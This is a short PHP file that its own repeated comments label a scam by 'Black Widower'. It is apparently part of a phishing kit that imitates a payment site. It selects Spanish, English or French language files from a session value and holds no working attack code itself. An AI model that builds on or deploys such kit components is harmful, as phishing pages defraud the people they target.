<?php
/***   Scam Made By Black Widower 2012=====201?  **/
/***   Scam Made By Black Widower 2012=====201?  **/
/***   Scam Made By Black Widower 2012=====201?  **/
/***   Scam Made By Black Widower 2012=====201?  **/
/***   Scam Made By Black Widower 2012=====201?  **/


if (!isset($_SESSION)) {
  session_start();
}

$var = $_SESSION['tempLang'];
define('PR_TARGET', '../WEBSCR-640-20101004-1/Marketing/css/pages/');

if( $var == "ES" ){
include "language_es.php";}

if( $var == "EN" ){
include "language_en.php";}

if( $var == "FR" ){
include "language_fr.php";}

/***   Scam Made By Black Widower 2012=====201?  **/
/***   Scam Made By Black Widower 2012=====201?  **/
/***   Scam Made By Black Widower 2012=====201?  **/
/***   Scam Made By Black Widower 2012=====201?  **/
/***   Scam Made By Black Widower 2012=====201?  **/
?>